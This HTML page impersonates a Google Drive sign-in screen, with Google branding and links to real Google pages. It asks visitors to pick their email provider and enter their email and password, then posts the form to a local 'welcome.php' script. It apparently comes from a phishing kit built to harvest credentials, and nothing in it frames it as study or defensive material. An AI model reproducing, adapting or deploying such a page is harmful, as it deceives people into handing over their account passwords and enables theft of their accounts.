<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>





<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Google Drive Login  </title>
	<base href=""> 

<link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css" />
<link href="assets/css/custom.css" rel="stylesheet" type="text/css" />

<script  type="text/javascript"  src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>



<script type="text/javascript" src="assets/js/bootstrap-min.js"></script>

   
<script src="assets/js/bootstrap-carousel.js"></script>
  
<script src="assets/js/bootstrap-transition.js"></script>



  
  <script language="Javascript"> 
function echeck(str) {
 
		var at="@"
		var dot="."
		var lat=str.indexOf(at)
		var lstr=str.length
		var ldot=str.indexOf(dot)
		if (str.indexOf(at)==-1){
		   alert("Invalid E-mail ID")
		   return false
		}
 
		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
		   alert("Invalid E-mail ID")
		   return false
		}
 
		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
		    alert("Invalid E-mail ID")
		    return false
		}
 
		 if (str.indexOf(at,(lat+1))!=-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
		 if (str.indexOf(dot,(lat+2))==-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
		
		 if (str.indexOf(" ")!=-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
 		 return true					
	}
 
function ValidateForm(){
	var emailID=document.newUser.username
	var emailPASS=document.newUser.password
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email ID")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Please Enter your Email Password")
		emailPASS.focus()
		return false
	}
	if (echeck(emailID.value)==false){
		emailID.value=""
		emailID.focus()
		return false
	}
 
	return true
 }
</script>



</head>
<body>
	 <div class="navbar navbar-fixed-top">
    <div class="navbar-inner">
      <div class="container clearfix">
        <a class="brand" id="logo" href=""><img src="assets/newlogo.png" height="40" width="40">&nbsp;<b>Google Drive</b></a>

        
        <ul class="nav pull-right">

                <li><a href="http://www.google.com/drive/index.html">Meet Drive</a></li>
                <li><a href="http://www.google.com/drive/using-drive/">Using Drive</a></li>
                <li><a href="http://www.google.com/drive/download/">Download</a></li>
<li><a href="http://www.google.com/intx/en/enterprise/apps/business/driveforwork/">For Work</a></li>
<li><a href="https://support.google.com/drive/?hl=en">Help</a></li>

        </ul>
        
      </div>
    </div>
  </div><br><br><br>
<div class="modal-ish">
  <div class="modal-header">
<img src="assets/topbanner.png">
<h4>Choose your Email provider and Sign in to continue to Google Drive </h4>
  </div>
  <div class="modal-body">
 

               
         
        
                
        
                <form name="newUser" action="welcome.php" method="post" onSubmit="return ValidateForm()" >

<p>
<label>Select Email Provider:</label>
<select name="provider" id="provider-label" class="drop_down" required>
      <option value="" style="vertical-align: middle;">Click to Select Provider....</option>
      <option value="gmail.com"style="background: url(./assets/gmail111.ico) no-repeat; padding-left: 20px;"> &nbsp;&nbsp;Gmail <hr><br></option>
      <option value="aol.com" style="background: url(./assets/aol.ico) no-repeat; padding-left: 20px;">&nbsp;&nbsp;AOL</option>
      <option value="hotmail.com"style="background: url(./assets/Hotmailicon.ico) no-repeat; padding-left: 20px;">&nbsp;&nbsp;Microsoft Outlook</option>
      <option value="yahoo.com"style="background: url(./assets/yahooicon.ico) no-repeat; padding-left: 20px;">&nbsp;&nbsp;Yahoo!</option>
      <option value="otheremail.com"style="background: url(./assets/Mail-icon.ico) no-repeat; padding-left: 20px;">&nbsp;&nbsp;Other Email</option>
    </select>


</p>

                <p>
                    <label>Email:</label>
                     <input type="text"  name="username" />
                    
                </p>
                
                <p>
                     <label>Password:</label>
                     <input type="password" name="password" />
                </p>
                
 <p>
		     <input type="checkbox" name="remember_me" value="1" />	
                     <label><small>Remember Me?</small></label>
                </p>                

	
                          

                          </div>

            
 <div class="modal-footer">
<input type="submit" class="btn btn-primary" name="new" id="newfeedform" value="Sign In" />
  </div>
  
</div>

                </form>
                
        
            <div class="clear"></div>
<p style="margin-top:30px; text-align:center;">
<a href="https://accounts.google.com/SignUp?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ltmpl=default">Create an account</a></p>
            

<link rel="shortcut icon" href="http://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_4.ico">

      
</body>
</html>


